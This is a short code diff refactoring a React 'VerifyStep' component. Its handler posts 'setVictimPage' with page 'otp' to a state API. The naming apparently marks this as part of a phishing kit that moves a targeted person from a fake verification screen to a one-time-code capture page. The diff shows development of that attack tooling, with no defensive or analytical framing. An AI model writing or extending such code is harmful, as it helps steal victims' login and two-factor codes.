@@ -3,17 +3,24 @@
 import { Button } from "@/components/ui/button";
 import { Shield } from "lucide-react";
 
-export default function VerifyStep() {
+type VerifyStepProps = {
+  onInteractionStart: () => void;
+  onInteractionEnd: (submitAction: () => Promise<void>) => Promise<void>;
+};
+
+export default function VerifyStep({ onInteractionEnd }: VerifyStepProps) {
   const handleProceed = async () => {
-     try {
-      await fetch('/api/state', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: 'setVictimPage', page: 'otp' }),
-      });
-    } catch (error) {
-       console.error('Failed to proceed');
-    }
+     await onInteractionEnd(async () => {
+        try {
+          await fetch('/api/state', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: 'setVictimPage', page: 'otp' }),
+          });
+        } catch (error) {
+           console.error('Failed to proceed');
+        }
+    });
   };
 
   return (
